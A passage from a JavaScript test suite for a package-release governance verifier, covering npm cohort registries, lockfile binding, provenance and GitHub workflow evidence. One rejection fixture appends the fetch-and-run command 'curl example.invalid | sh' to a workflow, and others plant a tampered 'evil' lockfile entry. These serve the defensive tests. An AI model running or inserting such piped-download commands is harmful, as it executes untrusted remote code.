    readPublishedPackage: async (_entry, paths) => new Map(paths.map((path) => [
      path,
      Buffer.from(path === "package.json" ? JSON.stringify({
        dependencies: { "@agent-teams/engineering-foundation": record.packages[0].version },
      }) : ASSET_CONTENTS[path]),
    ])),
    getWorkflowBlob: async () => record.reusable_workflow.blob_sha,
    getWorkflowSource: async () => qualifiedWorkflowSource,
    getRepository: async (repository) => ({
      id: repository === "agent-teams-ai/agent-runtime" ? 1314129620
        : repository === "agent-teams-ai/engineering-foundation" ? 1316243988 : 1316243981,
      full_name: repository,
      default_branch: "main",
    }),
    getDefaultBranch: async () => ({ protected: true, commit: { sha: "1".repeat(40) } }),
    isDefaultBranchAncestor: async () => true,
    getCheckRuns: async () => [{
      id: 456,
      head_sha: "7".repeat(40),
      name: "docs-protocol / docs-protocol-check",
      app: { id: 15368 },
      conclusion: "success",
      html_url: "https://github.com/agent-teams-ai/agent-runtime/actions/runs/123/job/456",
    }],
    getWorkflowRun: async (repository) => repository === "agent-teams-ai/engineering-foundation"
      ? {
        id: 123,
        run_attempt: 1,
        head_sha: "1".repeat(40),
        head_branch: "main",
        event: "push",
        conclusion: "success",
        path: ".github/workflows/release.yml",
        repository: { id: 1316243988, full_name: repository },
      }
      : {
        id: 123,
        head_sha: "7".repeat(40),
        head_branch: "main",
        event: "push",
        conclusion: "success",
        workflow_id: 789,
        path: ".github/workflows/docs-protocol.yml",
        repository: { id: 1314129620, full_name: "agent-teams-ai/agent-runtime" },
      },
    readRepositoryFile: async () => Buffer.from(
      "uses: agent-teams-ai/.github/.github/workflows/docs-protocol-check.yml@" +
      "2".repeat(40) + "\n",
    ),
    ...overrides,
  };
}

test("allows qualification before the informational eligible_after timestamp", () => {
  const candidate = registry();
  candidate.events[3].effective_at = "2026-08-16T02:00:01Z";
  let previous = null;
  for (const event of candidate.events) {
    event.previous_event_digest = previous;
    event.event_digest = cohortEventDigest(event);
    previous = event.event_digest;
  }
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    candidate, registrySchema, { asOf: "2026-08-16T02:00:01Z" },
  ));
});

test("allows verified evidence to qualify without a calendar cooldown event", () => {
  const candidate = registry(["PUBLISHED_UNQUALIFIED", "VERIFIED", "QUALIFIED"]);
  candidate.events[2].effective_at = "2026-08-16T01:00:01Z";
  let previous = null;
  for (const event of candidate.events) {
    event.previous_event_digest = previous;
    event.event_digest = cohortEventDigest(event);
    previous = event.event_digest;
  }
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    candidate, registrySchema, { asOf: "2026-08-16T01:00:01Z" },
  ));
});

test("orders mixed-precision lifecycle timestamps by instant, not text", () => {
  const candidate = registry();
  candidate.events[1].effective_at = "2026-08-16T00:00:00.100Z";
  let previous = null;
  for (const event of candidate.events) {
    event.previous_event_digest = previous;
    event.event_digest = cohortEventDigest(event);
    previous = event.event_digest;
  }
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    candidate, registrySchema, { asOf: "2026-08-18T00:00:00Z" },
  ));
});

test("permits delayed Cohort registration after a later emergency event", () => {
  const candidate = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "SUSPENDED",
  ]);
  const prior = candidate.cohorts[0];
  const delayed = structuredClone(prior);
  delayed.cohort_id = "docs-2026-08-19-rc2";
  delayed.upgrade_from = [prior.cohort_id];
  delayed.rollback_to = [prior.cohort_id];
  delayed.eligible_after = "2026-08-17T00:00:00Z";
  for (const [index, entry] of delayed.packages.entries()) {
    entry.version = index === 0 ? "0.18.1-rc.0" : "0.2.1-rc.0";
    entry.provenance.registry_attestation_url =
      `https://registry.npmjs.org/-/npm/v1/attestations/${entry.name.replace("/", "%2f")}@${entry.version}`;
  }
  delayed.record_digest = cohortRecordDigest(delayed);
  candidate.cohorts.push(delayed);
  const event = {
    sequence: candidate.events.length + 1,
    cohort_id: delayed.cohort_id,
    state: "PUBLISHED_UNQUALIFIED",
    effective_at: "2026-08-16T00:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/delayed-registration.json"],
    canary_evidence: [],
    previous_event_digest: candidate.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  event.event_digest = cohortEventDigest(event);
  candidate.events.push(event);
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    candidate, registrySchema, { asOf: "2026-08-18T03:00:00Z" },
  ));
});

test("rejects per-Cohort time reversal while allowing cross-Cohort delay", () => {
  const candidate = registry();
  candidate.events.at(-1).effective_at = "2026-08-16T01:59:59Z";
  candidate.events.at(-1).event_digest = cohortEventDigest(candidate.events.at(-1));
  assert.throws(() => validateDocsQualifiedCohorts(
    candidate, registrySchema, { asOf: "2026-08-18T00:00:00Z" },
  ), /cannot move backwards/u);
});

test("requires second-precision eligibility and bounded migration arrays", () => {
  const milliseconds = registry();
  milliseconds.cohorts[0].eligible_after = "2026-08-18T00:00:00.000Z";
  milliseconds.cohorts[0].record_digest = cohortRecordDigest(milliseconds.cohorts[0]);
  assert.throws(() => validateDocsQualifiedCohorts(milliseconds, registrySchema), /JSON Schema/u);

  const oversized = registry();
  oversized.cohorts[0].upgrade_from = Array.from({ length: 33 }, (_, index) => `prior-${index}`);
  oversized.cohorts[0].record_digest = cohortRecordDigest(oversized.cohorts[0]);
  assert.throws(() => validateDocsQualifiedCohorts(oversized, registrySchema), /JSON Schema/u);
});

test("accepts npm's literal-at attestation URL and rejects percent-encoded-at", () => {
  const candidate = registry();
  assert.match(candidate.cohorts[0].packages[0].provenance.registry_attestation_url,
    /attestations\/@agent-teams%2fengineering-foundation@/u);
  const encoded = structuredClone(candidate);
  encoded.cohorts[0].packages[0].provenance.registry_attestation_url =
    encoded.cohorts[0].packages[0].provenance.registry_attestation_url.replace("/@", "/%40");
  encoded.cohorts[0].record_digest = cohortRecordDigest(encoded.cohorts[0]);
  assert.throws(() => validateDocsQualifiedCohorts(
    encoded, registrySchema, { asOf: "2026-08-18T00:00:00Z" },
  ), /JSON Schema/u);
});

test("binds root importer to one physical managed package resolution", () => {
  const expected = [
    { name: "@agent-teams/docs-protocol", version: "0.2.0-rc.0", integrity: INTEGRITY },
    { name: "@agent-teams/engineering-foundation", version: "0.18.0-rc.0", integrity: INTEGRITY },
  ];
  const manifest = { dependencies: Object.fromEntries(expected.map(({ name, version }) => [name, version])) };
  const rootDependencies = Object.fromEntries(expected.map(({ name, version }) => [name, {
    specifier: version,
    version,
  }]));
  const lock = YAML.parse(YAML.stringify({
    lockfileVersion: "9.0",
    importers: { ".": { dependencies: rootDependencies } },
    packages: Object.fromEntries(expected.map(({ name, version, integrity }) => [
      `${name}@${version}`,
      { resolution: { integrity } },
    ])),
  }));
  assert.doesNotThrow(() => validateDocsConsumerLock(manifest, lock, expected));

  const duplicate = structuredClone(lock);
  duplicate.importers["."].dependencies[expected[0].name].version = `${expected[0].version}(evil@1.0.0)`;
  duplicate.packages[`${expected[0].name}@${expected[0].version}(evil@1.0.0)`] = {
    resolution: { integrity: `sha512-${"B".repeat(86)}==` },
  };
  assert.throws(() => validateDocsConsumerLock(manifest, duplicate, expected),
    /one root-bound physical/u);

  const nested = structuredClone(lock);
  nested.importers["packages/evil"] = { dependencies: {
    [expected[0].name]: { specifier: "9.9.9", version: "9.9.9" },
  } };
  nested.packages[`${expected[0].name}@9.9.9`] = { resolution: { integrity: INTEGRITY } };
  assert.throws(() => validateDocsConsumerLock(manifest, nested, expected), /managed pin/u);
});

test("binds peer-qualified transitive locators and rejects aliased runtime edges", () => {
  const expected = cohort().packages.map(({ name, version, integrity }) => ({ name, version, integrity }));
  const lock = runtimeLock();
  lock.importers["."].devDependencies["@agent-teams/docs-protocol"].version =
    "0.2.0-rc.0(peer-package@1.0.0)";
  lock.packages["peer-package@1.0.0"] = { resolution: { integrity: `sha512-${"P".repeat(86)}==` } };
  delete lock.snapshots["@agent-teams/docs-protocol@0.2.0-rc.0"];
  lock.snapshots["@agent-teams/docs-protocol@0.2.0-rc.0(peer-package@1.0.0)"] = {
    dependencies: { "@agent-teams/engineering-foundation": "0.18.0-rc.0" },
    optionalDependencies: { "peer-package": "1.0.0" },
  };
  lock.snapshots["peer-package@1.0.0"] = {};

  const projection = docsRuntimeClosureProjection(lock, expected);
  assert.ok(projection.roots.some(({ locator }) =>
    locator === "@agent-teams/docs-protocol@0.2.0-rc.0(peer-package@1.0.0)"));
  assert.equal(projection.packageCount, 3);
  const original = docsRuntimeClosureAuthority(lock, expected).digest;
  lock.packages["peer-package@1.0.0"].resolution.integrity = `sha512-${"Q".repeat(86)}==`;
  assert.notEqual(docsRuntimeClosureAuthority(lock, expected).digest, original);

  lock.snapshots["@agent-teams/docs-protocol@0.2.0-rc.0(peer-package@1.0.0)"]
    .optionalDependencies["peer-package"] = "npm:other@1.0.0";
  assert.throws(() => docsRuntimeClosureProjection(lock, expected),
    /bounded registry resolution|non-registry or aliased/iu);
});

test("live verifier binds tarball dependency/assets and exact hosted canary evidence", async () => {
  const candidate = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY",
  ]);
  const record = candidate.cohorts[0];
  await assert.doesNotReject(verifyDocsCohortEvidence(
    candidate, registrySchema, record.cohort_id, verifierAdapters(record),
  ));
  await assert.rejects(verifyDocsCohortEvidence(
    candidate, registrySchema, record.cohort_id, verifierAdapters(record, {
      getRepository: async (repository) => ({
        id: repository === "agent-teams-ai/engineering-foundation" ? 999
          : repository === "agent-teams-ai/agent-runtime" ? 1314129620 : 1316243981,
        full_name: repository,
        default_branch: "main",
      }),
    }),
  ), /provenance source/iu);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate, registrySchema, record.cohort_id, verifierAdapters(record, {
      getRepository: async (repository) => ({
        id: repository === "agent-teams-ai/.github" ? 999
          : repository === "agent-teams-ai/agent-runtime" ? 1314129620 : 1316243988,
        full_name: repository,
        default_branch: "main",
      }),
    }),
  ), /workflow repository identity/iu);
  const adaptersWithRecreatedRunRepository = verifierAdapters(record);
  const getWorkflowRun = adaptersWithRecreatedRunRepository.getWorkflowRun;
  adaptersWithRecreatedRunRepository.getWorkflowRun = async (repository, runId) => {
    const run = await getWorkflowRun(repository, runId);
    return repository === "agent-teams-ai/engineering-foundation"
      ? { ...run, repository: { ...run.repository, id: 999 } }
      : run;
  };
  await assert.rejects(verifyDocsCohortEvidence(
    candidate, registrySchema, record.cohort_id, adaptersWithRecreatedRunRepository,
  ), /live release workflow run/iu);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, { resolveRuntimeClosure: async () => ({
      ...runtimeClosureEvidence(),
      authority: {
        ...record.runtime_closure,
        digest: `sha256:${"f".repeat(64)}`,
      },
    }) }),
  ), /runtime closure differs/iu);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, {
      isDefaultBranchAncestor: async (repository) =>
        repository === "agent-teams-ai/engineering-foundation",
    }),
  ), /not merged/u);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, { getCheckRuns: async () => [{
      id: 456,
      head_sha: "7".repeat(40),
      name: "docs-protocol / docs-protocol-check",
      app: { id: 999 },
      conclusion: "success",
      html_url: "https://github.com/agent-teams-ai/agent-runtime/actions/runs/123/job/456",
    }] }),
  ), /exactly bind/u);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, { readPublishedPackage: async (_entry, paths) => new Map(paths.map((path) => [
      path,
      Buffer.from(path === "package.json" ? JSON.stringify({ dependencies: {
        "@agent-teams/engineering-foundation": "^0.18.0",
      } }) : ASSET_CONTENTS[path]),
    ])) }),
  ), /depend on exact/u);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, { readRepositoryFile: async () => Buffer.from("forged\n") }),
  ), /caller bytes differ/u);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, { getWorkflowRun: async (repository) =>
      repository === "agent-teams-ai/engineering-foundation"
        ? {
          id: 123, run_attempt: 1, head_sha: "1".repeat(40), head_branch: "main",
          event: "push", conclusion: "success", path: ".github/workflows/release.yml",
          repository: { id: 1316243988, full_name: repository },
        }
        : {
          id: 123, head_sha: "7".repeat(40), head_branch: "main", event: "push",
          conclusion: "success", workflow_id: 789, path: ".github/workflows/forged.yml",
          repository: { id: 1314129620, full_name: "agent-teams-ai/agent-runtime" },
        } }),
  ), /Actions run does not exactly bind/u);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, { getWorkflowRun: async (repository) =>
      repository === "agent-teams-ai/engineering-foundation"
        ? {
          id: 123, run_attempt: 2, head_sha: "1".repeat(40), head_branch: "main",
          event: "push", conclusion: "success", path: ".github/workflows/forged-release.yml",
          repository: { id: 1316243988, full_name: repository },
        }
        : {
          id: 123, head_sha: "7".repeat(40), head_branch: "main", event: "push",
          conclusion: "success", workflow_id: 789, path: ".github/workflows/docs-protocol.yml",
          repository: { id: 1314129620, full_name: repository },
        } }),
  ), /live release workflow run does not bind/u);
});

test("live append verification covers each Cohort touched by new records or events", async () => {
  const current = registry();
  let signatureVerifications = 0;
  const changed = await verifyChangedDocsCohortEvidence(
    structuredClone(emptyRegistry),
    current,
    registrySchema,
    verifierAdapters(current.cohorts[0], {
      verifySignatures: async (packages) => {
        signatureVerifications += 1;
        return verifierAdapters(current.cohorts[0]).verifySignatures(packages);
      },
    }),
  );
  assert.deepEqual(changed, [current.cohorts[0].cohort_id]);
  assert.equal(signatureVerifications, 1);
});

test("rejects a known unsafe historical reusable workflow revision", async () => {
  const candidate = registry();
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    candidate.cohorts[0].cohort_id,
    verifierAdapters(candidate.cohorts[0], {
      getWorkflowSource: async () => Buffer.from(`name: Documentation Protocol Check
on:
  workflow_call:
permissions:
  contents: read
jobs:
  docs-protocol-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@2679c8bc1e432091271d2f68ef904694e4d5838e
      - run: pnpm install
      - run: pnpm docs:protocol:check
`),
    }),
  ), /qualified safe closure/u);
});

test("rejects raw registry provenance that differs from the verified npm audit bundle", async () => {
  const candidate = registry();
  const record = candidate.cohorts[0];
  const adapters = verifierAdapters(record);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    {
      ...adapters,
      fetchJson: async (url) => {
        const raw = await adapters.fetchJson(url);
        raw.attestations[0].predicateType = "https://example.invalid/forged";
        return raw;
      },
    },
  ), /raw registry attestation differs from the cryptographically verified audit bundle/u);
});

test("rejects deleted and recreated provenance repositories with the same name", async () => {
  const candidate = registry();
  const record = candidate.cohorts[0];
  const adapters = verifierAdapters(record);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    {
      ...adapters,
      getRepository: async (repository) => repository === "agent-teams-ai/engineering-foundation"
        ? { id: 999999999, full_name: repository, default_branch: "main" }
        : adapters.getRepository(repository),
    },
  ), /provenance source is not on its protected default branch/u);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    {
      ...adapters,
      getWorkflowRun: async (repository, runId) => {
        const run = await adapters.getWorkflowRun(repository, runId);
        return repository === "agent-teams-ai/engineering-foundation"
          ? { ...run, repository: { ...run.repository, id: 999999999 } }
          : run;
      },
    },
  ), /live release workflow run does not bind/u);
});

test("rejects a workflow with appended commands when its blob differs from protected default", async () => {
  const candidate = registry();
  const record = candidate.cohorts[0];
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, {
      getWorkflowBlob: async (entry) => entry.revision === record.reusable_workflow.revision
        ? record.reusable_workflow.blob_sha
        : "f".repeat(40),
      getWorkflowSource: async () => Buffer.concat([
        qualifiedWorkflowSource,
        Buffer.from("\n# attacker-appended-command: curl example.invalid | sh\n"),
      ]),
    }),
  ), /exact current protected-default-branch workflow/u);
});

test("rejects reusable workflow authority outside the protected default branch", async () => {
  const candidate = registry();
  const record = candidate.cohorts[0];
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, {
      getDefaultBranch: async (repository) => ({
        protected: repository !== record.reusable_workflow.repository,
        commit: { sha: "1".repeat(40) },
      }),
    }),
  ), /default branch is not protected/u);
  await assert.rejects(verifyDocsCohortEvidence(
    candidate,
    registrySchema,
    record.cohort_id,
    verifierAdapters(record, {
      isDefaultBranchAncestor: async (repository) => repository !== record.reusable_workflow.repository,
    }),
  ), /not merged into its protected default branch/u);
});

test("RECOMMENDED promotion re-verifies CANARY evidence from an earlier PR", async () => {
  const previous = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY",
  ]);
  const current = structuredClone(previous);
  const event = {
    sequence: current.events.length + 1,
    cohort_id: current.cohorts[0].cohort_id,
    state: "RECOMMENDED",
    effective_at: "2026-08-18T02:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/recommended.json"],
    canary_evidence: [],
    previous_event_digest: current.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  event.event_digest = cohortEventDigest(event);
  current.events.push(event);
  await assert.rejects(verifyChangedDocsCohortEvidence(
    previous,
    current,
    registrySchema,
    verifierAdapters(current.cohorts[0], {
      getCheckRuns: async () => [],
    }),
  ), /hosted canary check/u);
});

test("live-verifies admitted default-branch evidence against consumer bytes", async () => {
  const candidateRegistry = registry();
  const record = candidateRegistry.cohorts[0];
  const qualification = candidateRegistry.events.find(({ state }) => state === "QUALIFIED");
  const policy = structuredClone(docsPolicy);
  const consumer = policy.repositories.find(
    ({ repository }) => repository === "agent-teams-ai/agent-runtime",
  );
  Object.assign(consumer, {
    cohort_binding_status: "bound",
    desired_cohort_id: record.cohort_id,
    observed_cohort_id: record.cohort_id,
    observed_cohort_record_digest: record.record_digest,
    observed_cohort_event_digest: qualification.event_digest,
    exact_foundation_version: record.packages[0].version,
    exact_package_version: record.packages[1].version,
    reusable_workflow_revision: record.reusable_workflow.revision,
    required_check_context: "docs-protocol / docs-protocol-check",
    observed_default_branch_evidence: defaultBranchEvidence(
      consumer.repository,
      consumer.qualification.observed_revision,
    ),
  });
  const evidence = consumer.observed_default_branch_evidence;
  const projection = Buffer.from(JSON.stringify({
    cohortId: record.cohort_id,
    cohortAuthority: {
      recordDigest: record.record_digest,
      qualificationEventDigest: qualification.event_digest,
    },
  }));
  const adapters = {
    asOf: "2026-08-18T00:00:00Z",
    getRepository: async () => ({
      id: consumer.repository_id,
      full_name: consumer.repository,
      default_branch: evidence.default_branch,
    }),
    getDefaultBranchHead: async () => evidence.revision,
    getCheckRuns: async () => [{
      id: evidence.check_run_id,
      head_sha: evidence.revision,
      name: evidence.required_context,
      app: { id: evidence.integration_id },
      conclusion: "success",
      html_url: evidence.check_run_url,
    }],
    getWorkflowRun: async () => ({
      id: evidence.workflow_run_id,
      workflow_id: evidence.workflow_id,
      head_sha: evidence.revision,
      head_branch: evidence.default_branch,
      event: "push",
      conclusion: "success",
      path: evidence.caller_workflow_path,
      repository: { id: consumer.repository_id, full_name: consumer.repository },
    }),
    readRepositoryFile: async (_repository, path) => path.endsWith("managed-state.json")
      ? projection
      : Buffer.from(
        `uses: ${record.reusable_workflow.repository}/${record.reusable_workflow.path}@${record.reusable_workflow.revision}\n`,
      ),
  };
  assert.deepEqual(await verifyDocsAdmissionEvidence(
    policy, candidateRegistry, registrySchema, adapters,
  ), [consumer.repository_id]);
  const priorCredential = process.env.DOCS_GOVERNANCE_READ_TOKEN;
  delete process.env.DOCS_GOVERNANCE_READ_TOKEN;
  try {
    await assert.rejects(verifyDocsAdmissionEvidence(
      policy, candidateRegistry, registrySchema, { ...adapters, requireCredential: true },
    ), /requires DOCS_GOVERNANCE_READ_TOKEN/u);
  } finally {
    if (priorCredential !== undefined) {
      process.env.DOCS_GOVERNANCE_READ_TOKEN = priorCredential;
    }
  }
  await assert.rejects(verifyDocsAdmissionEvidence(
    policy, candidateRegistry, registrySchema, {
      ...adapters,
      getDefaultBranchHead: async () => "9".repeat(40),
    },
  ), /exact current default-branch head/u);
});

test("emergency suspension and withdrawal remain available while npm and GitHub are offline", async () => {
  const previous = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const current = structuredClone(previous);
  const event = {
    sequence: current.events.length + 1,
    cohort_id: current.cohorts[0].cohort_id,
    state: "SUSPENDED",
    effective_at: "2026-08-18T03:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/suspension.json"],
    canary_evidence: [],
    previous_event_digest: current.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  event.event_digest = cohortEventDigest(event);
  current.events.push(event);
  const withdrawal = {
    ...event,
    sequence: event.sequence + 1,
    state: "WITHDRAWN",
    effective_at: "2026-08-18T03:01:00Z",
    evidence_references: ["governance/evidence/withdrawal.json"],
    previous_event_digest: event.event_digest,
  };
  withdrawal.event_digest = cohortEventDigest(withdrawal);
  current.events.push(withdrawal);
  const record = current.cohorts[0];
  const online = verifierAdapters(record, { asOf: "2026-08-18T03:01:00Z" });
  const offline = Object.fromEntries(Object.entries(online).map(([name, value]) => [
    name,
    typeof value === "function"
      ? async () => {throw new Error(`${name} unavailable`);}
      : value,
  ]));
  await assert.doesNotReject(verifyChangedDocsCohortEvidence(
    previous,
    current,
    registrySchema,
    offline,
  ));
});

test("renders each caller authority placeholder exactly once", () => {
  const workflow = cohort().reusable_workflow;
  const rendered = renderCallerWorkflowTemplate(
    Buffer.from(ASSET_CONTENTS["assets/docs-protocol.yml"]),
    workflow,
  );
  assert.equal(`sha256:${createHash("sha256").update(rendered).digest("hex")}`,
    renderedCallerDigest());
  for (const invalid of [
    ASSET_CONTENTS["assets/docs-protocol.yml"].replace("{{REUSABLE_WORKFLOW_PATH}}", "static.yml"),
    `${ASSET_CONTENTS["assets/docs-protocol.yml"]}# {{REUSABLE_WORKFLOW_REVISION}}\n`,
    ASSET_CONTENTS["assets/docs-protocol.yml"].replace(
      "{{REUSABLE_WORKFLOW_PATH}}",
      "{{UNTRUSTED_INJECTION}}",
    ),
  ]) {
    assert.throws(() => renderCallerWorkflowTemplate(Buffer.from(invalid), workflow),
      /each exact authority placeholder once/u);
  }
});

test("renders the cross-repository packed producer caller fixture", () => {
  const workflow = cohort().reusable_workflow;
  const rendered = renderCallerWorkflowTemplate(producerCallerFixture, workflow).toString("utf8");
  assert.match(rendered, new RegExp(
    `uses: ${workflow.repository}/${workflow.path}@${workflow.revision}`,
    "u",
  ));
  assert.doesNotMatch(rendered, /\{\{/u);
});

test("rejects a concurrent append made from a stale event prefix", () => {
  const base = registry();
  const stale = structuredClone(base);
  stale.events.splice(2, 0, structuredClone(stale.events[1]));
  assert.throws(() => assertDocsCohortAppendOnly(base, stale), /immutable/u);
});

test("records a suspended observed binding while consumer gates fail closed", () => {
  const suspended = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const terminal = {
    sequence: suspended.events.length + 1,
    cohort_id: suspended.cohorts[0].cohort_id,
    state: "SUSPENDED",
    effective_at: "2026-08-18T03:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/suspension.json"],
    canary_evidence: [],
    previous_event_digest: suspended.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  terminal.event_digest = cohortEventDigest(terminal);
  suspended.events.push(terminal);
  const policy = structuredClone(docsPolicy);
  const consumer = policy.repositories.find(({ repository }) => repository === "agent-teams-ai/agent-runtime");
  const record = suspended.cohorts[0];
  consumer.cohort_binding_status = "bound";
  consumer.desired_cohort_id = record.cohort_id;
  consumer.observed_cohort_id = record.cohort_id;
  consumer.observed_cohort_record_digest = record.record_digest;
  consumer.observed_cohort_event_digest = suspended.events.find(({ state }) => state === "QUALIFIED").event_digest;
  consumer.exact_foundation_version = record.packages[0].version;
  consumer.exact_package_version = record.packages[1].version;
  consumer.reusable_workflow_revision = record.reusable_workflow.revision;
  consumer.required_check_context = "docs-protocol / docs-protocol-check";
  consumer.observed_default_branch_evidence = defaultBranchEvidence(
    consumer.repository,
    consumer.qualification.observed_revision,
  );
  assert.doesNotThrow(() => validateDocsGovernanceReferences(
    suspended,
    exceptions,
    policy,
    securityPolicy,
    { asOf: "2026-08-18T03:00:00Z" },
  ));
  consumer.repository_lifecycle = "archived";
  assert.doesNotThrow(() => validateDocsGovernanceReferences(
    suspended,
    exceptions,
    policy,
    securityPolicy,
    { asOf: "2026-08-18T03:00:00Z" },
  ));
});

test("permits SUPERSEDED support window then explicit SUPPORT_ENDED", () => {
  const candidate = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const append = (state, effectiveAt, supportUntil = null) => {
    const event = {
      sequence: candidate.events.length + 1,
      cohort_id: candidate.cohorts[0].cohort_id,
      state,
      effective_at: effectiveAt,
      support_until: supportUntil,
      evidence_references: [`governance/evidence/${state.toLowerCase()}.json`],
      canary_evidence: [],
      previous_event_digest: candidate.events.at(-1).event_digest,
      event_digest: `sha256:${"0".repeat(64)}`,
    };
    event.event_digest = cohortEventDigest(event);
    candidate.events.push(event);
  };
  append("SUPERSEDED", "2026-08-18T03:00:00Z", "2026-09-18T03:00:00Z");
  append("SUPPORT_ENDED", "2026-09-18T03:00:00Z");
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    candidate,
    registrySchema,
    { asOf: "2026-09-18T03:00:00Z" },
  ));

  const early = structuredClone(candidate);
  early.events.at(-1).effective_at = "2026-09-18T02:59:59Z";
  early.events.at(-1).event_digest = cohortEventDigest(early.events.at(-1));
  assert.throws(() => validateDocsQualifiedCohorts(
    early,
    registrySchema,
    { asOf: "2026-09-18T03:00:00Z" },
  ), /cannot end support before/u);
});

test("keeps immutable historical canary identity independent from current active inventory", () => {
  const candidate = registry();
  candidate.cohorts[0].canary_repositories = [{
    repository_id: 1316243981,
    repository: "agent-teams-ai/.github",
  }];
  candidate.cohorts[0].record_digest = cohortRecordDigest(candidate.cohorts[0]);
  assert.doesNotThrow(() => validateDocsGovernanceReferences(
    candidate,
    exceptions,
    structuredClone(docsPolicy),
    securityPolicy,
    { asOf: "2026-08-18T00:00:00Z" },
  ));
});

test("breaks the bootstrap cycle with a desired-only admission candidate", () => {
  const candidateRegistry = registry();
  const policy = structuredClone(docsPolicy);
  const consumer = policy.repositories.find(
    ({ repository }) => repository === "agent-teams-ai/agent-runtime",
  );
  Object.assign(consumer, {
    admission_status: "admission_candidate",
    exact_package_version: null,
    exact_foundation_version: null,
    cohort_binding_status: "bootstrap_pending",
    desired_cohort_id: candidateRegistry.cohorts[0].cohort_id,
    observed_cohort_id: null,
    observed_cohort_record_digest: null,
    observed_cohort_event_digest: null,
    reusable_workflow_revision: null,
    required_check_context: "docs-protocol / docs-protocol-check",
    observed_default_branch_evidence: null,
    qualification: { status: "not_qualified", observed_revision: null, evidence_paths: [] },
  });
  assert.doesNotThrow(() => validateDocsGovernanceReferences(
    candidateRegistry, exceptions, policy, securityPolicy, { asOf: "2026-08-18T00:00:00Z" },
  ));

  consumer.admission_status = "admitted";
  consumer.cohort_binding_status = "bound";
  assert.throws(() => validateDocsGovernanceReferences(
    candidateRegistry, exceptions, policy, securityPolicy, { asOf: "2026-08-18T00:00:00Z" },
  ), /default-branch green evidence/u);
});

test("permits desired/observed staging only across an explicit migration edge", () => {
  const staged = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const appendEvent = (cohortId, state, effectiveAt) => {
    const event = {
      sequence: staged.events.length + 1,
      cohort_id: cohortId,
      state,
      effective_at: effectiveAt,
      support_until: state === "SUPERSEDED" ? "2026-09-18T03:00:00Z" : null,
      evidence_references: [`governance/evidence/${staged.events.length + 1}.json`],
      canary_evidence: [],
      previous_event_digest: staged.events.at(-1).event_digest,
      event_digest: `sha256:${"0".repeat(64)}`,
    };
    event.event_digest = cohortEventDigest(event);
    staged.events.push(event);
  };
  appendEvent(staged.cohorts[0].cohort_id, "SUPERSEDED", "2026-08-18T03:00:00Z");
  const successor = structuredClone(staged.cohorts[0]);
  successor.cohort_id = "docs-2026-08-19-rc2";
  successor.upgrade_from = [staged.cohorts[0].cohort_id];
  successor.rollback_to = [staged.cohorts[0].cohort_id];
  successor.eligible_after = "2026-08-19T04:00:00Z";
  successor.reusable_workflow.revision = "8".repeat(40);
  successor.reusable_workflow.blob_sha = "9".repeat(40);
  for (const [index, entry] of successor.packages.entries()) {
    entry.version = index === 0 ? "0.19.0-rc.0" : "0.3.0-rc.0";
    entry.published_at = "2026-08-18T04:00:00Z";
    entry.provenance.registry_attestation_url =
      `https://registry.npmjs.org/-/npm/v1/attestations/${entry.name.replace("/", "%2f")}@${entry.version}`;
  }
  successor.record_digest = cohortRecordDigest(successor);
  staged.cohorts.push(successor);
  appendEvent(successor.cohort_id, "PUBLISHED_UNQUALIFIED", "2026-08-18T04:00:00Z");
  appendEvent(successor.cohort_id, "VERIFIED", "2026-08-18T05:00:00Z");
